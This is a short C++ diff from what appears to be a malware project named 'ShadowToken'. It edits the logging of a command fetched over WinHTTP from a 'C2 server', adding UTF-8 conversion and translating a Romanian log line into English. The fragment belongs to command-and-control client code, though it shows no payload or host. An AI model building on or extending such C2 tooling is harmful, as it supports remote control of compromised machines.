@@ -114,7 +114,8 @@ namespace ShadowToken {
             WinHttpCloseHandle(hSession);
 
             if (!command.empty()) {
-                std::cout << "[Info] Comandă primită: " << command << std::endl;
+                std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+                std::cout << "[Info] Command received: " << converter.to_bytes(command) << std::endl;
             } else {
                 std::cerr << "[Warning] Nicio comandă nouă primită de la serverul C2." << std::endl;
             }
